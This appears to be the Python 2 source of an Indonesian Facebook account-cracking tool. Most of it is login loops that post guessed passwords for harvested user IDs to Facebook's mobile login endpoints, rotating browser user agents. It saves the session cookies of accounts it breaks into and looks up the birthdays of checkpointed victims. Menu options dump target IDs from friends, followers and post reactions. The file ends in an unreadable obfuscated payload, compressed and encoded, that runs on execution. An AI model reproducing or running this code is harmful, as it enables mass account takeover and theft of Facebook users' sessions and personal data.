like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]','Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138 (UCMini) Mobile','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF','Mozilla/5.0 (Linux; Android 9; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45','Mozilla/5.0 (Series40; NokiaC2-02/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone  OS 7.5; Trident/5.0; IEMobile/9.0','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF','Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Nokia5800/20.0.002 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413'])
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; U; Android 8.0.0; es-LA; moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.10.1227 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://touch.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s--> %s | %s | %s  ' % (H,user,pw,coki)
                ok.append("%s|%s|%s"% (user,pw,coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s--> %s | %s            ' % (K,user,pw)
                cp.append("%s|%s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        #rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobile(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({
            "Host":"m.facebook.com",
            "cache-control":"max-age=0",
            "upgrade-insecure-requests":"1",
            "user-agent":ua,
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding":"gzip, deflate",
            "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.8"
            })
            p = ses.get("https://m.facebook.com/")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s--> %s | %s | %s ' % (H,user,pw,coki)
                ok.append("%s|%s|%s"% (user,pw,coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s\n"%(user,pw,coki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s--> %s | %s              ' % (K,user,pw)
                cp.append("%s|%s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()     
# GANTI USER AGENT
def useragent():
	print ("\n%s[%s1%s] Ganti User Agent "%(P,K,P))
	print ("[%s2%s] Cek User Agent "%(K,P))
	print ("[%s0%s] Kembali Ke Menu "%(H,P))
	uas()
def uas():
    __Aang__Sayang__Laura__ = raw_input('\n%s[•] Pilih :%s '%(P,K))
    if __Aang__Sayang__Laura__ == '':
        print("%s[•] Isi yang benar kentod"%(M));jeda(2);uas()
    elif __Aang__Sayang__Laura__ in("1","01"):
    	print ("\n%s[%s•%s] ketik %sMy user agent%s di browser google chrome\n[%s•%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print ("[%s•%s] ketik %sdefault%s untuk gunakan user agent bawaan script"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s[?] User Agent : %s"%(P,K))
            if ua in(""):
            	print("%s[•] Isi yang benar kentod ] "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s[•] Anda akan di arahkan ke browser ] "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("Default","DEFAULT","default"):
                ua = 'Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s[✓] Menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s[✓] Berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif __Aang__Sayang__Laura__ in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s[%s✓%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s[ %sKembali%s ] "%(P,H,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif __Aang__Sayang__Laura__ in("0","00"):
    	menu()
    else:
        print("%s[•] Isi yang benar kentod"%(M));jeda(2);uas()
# INI MENU ANJING !!!!!!!!
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    	cookie = {'cookie':open("cookie.txt","r").read()}
    except IOError:
        print ("%s[%s!%s] Token invalid tod ! "%(P,M,P));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,cookies=cookie,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s[%s!%s] Token invalid tod !"%(P,M,P));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s[%s!%s] Ndak ada koneksi internet ! "%(P,M,P))
    banner()
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mIP Kamu   : %s%s'%(P,IP,P))
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mVersion   : 2.0.4'%(P))
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mNama Kamu : %s Ngentod %s\n'%(P,nama,H))
    print('%s[%s1%s] Dump ID Dari Teman Publik'%(P,K,P));time.sleep(0.03)
    print('[%s2%s] Dump ID Dari Total Followers'%(K,P));time.sleep(0.03)
    print('[%s3%s] Dump ID Dari React Post'%(K,P));time.sleep(0.03)
    print('[%s4%s] %sMulai Crack %s'%(U,P,H,P));time.sleep(0.03)
    print('[%s5%s] Setting/Ganti User Agent'%(U,P));time.sleep(0.03)
    print('[%s6%s] Lihat %sResults%s Crack'%(U,P,H,P));time.sleep(0.03)
    print('[%s7%s] Dump ID Secara Massal (%sSering Eror%s)'%(H,P,H,P));time.sleep(0.03)
    print('[%s8%s] Cek Opsi Akun Checkpoin'%(H,P));time.sleep(0.03)
    print('[%s0%s] Keluar (%sHapus Token%s) '%(M,P,H,P));time.sleep(0.03)
    __Aang__Sayang__Laura__ = raw_input('\n%s[?] Pilih : %s'%(P,K));time.sleep(0.03)
    if __Aang__Sayang__Laura__ == '':
        print("%s[•] Isi yang benar kentod"%(M));jeda(2);menu()
    elif __Aang__Sayang__Laura__ in['1','01']:
        publik(romz,cookie)
    elif __Aang__Sayang__Laura__ in['2','02']:
        followers(romz)
    elif __Aang__Sayang__Laura__ in['3','03']:
        postingan(romz)
    elif __Aang__Sayang__Laura__ in['4','04']:
        ngentod().mantan()
    elif __Aang__Sayang__Laura__ in['5','05']:
    	useragent()
    elif __Aang__Sayang__Laura__ in['6','06']:
    	print "\n%s[%s1%s] Hasil crack akun facebook "%(P,K,P)
        __Aang__Sayang__Laura__ = raw_input('%s[%s?%s] Pilih: %s'%(P,K,P,H))
    	hasill(__Aang__Sayang__Laura__)
    elif __Aang__Sayang__Laura__ in['7','07']:
        __aangxlaura__()
    elif __Aang__Sayang__Laura__ in['8','08']:
        cek_opsi()
    elif __Aang__Sayang__Laura__ in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s[%s✓%s] Berhasil terhapus'%(P,H,P));exit()
    else:
        print("%s[•] Isi yang benar kentod"%(K));jeda(2);menu()
def hasill(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ in[""]:
		print ("%s[%s•%s] isi yang benar kentod"%(P,P,K));exit()
	elif __Aang__Sayang__Laura__ in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s[+] %s%s"%(P,B,file));time.sleep(0.02)
			print("\n%s[%s•%s] Contoh : CP-%s-%s-%s%s"%(P,K,P,ha,op,ta,".txt"))
			file = raw_input("%s[?] Masukan nama file : "%(P));jeda(1)
			if file == "":
				print("%s[!] File gak ada kentod"%(K))
			total = open("hasil/%s"%(file)).read().splitlines()
			print("%s[%s•%s] Hasil Crack Akun Facebook"%(P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan("[%s•%s] Total Akun : %s"%(K,P,len(total)))
			print("%s[%s#%s]--------------------------------------------------%s"%(P,K,P,H));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace("[×] ", "[×]").replace("[×]", "[×] ")
				print(tling);jeda(0.03)
			print("%s[%s#%s]--------------------------------------------------%s"%(P,K,P,H));jeda(2)
			raw_input('\n%s[ %sTekan Enter%s ]'%(P,H,P));menu()
		except (IOError):
			print("\n%s[!] Gak Dapet Hasil Awokawok "%(K))
			raw_input('\n%s[ %sTekan Enter%s ]'%(P,H,P));menu()
			
# KOPI + PERAWAN = LAMBADA XIXI :V
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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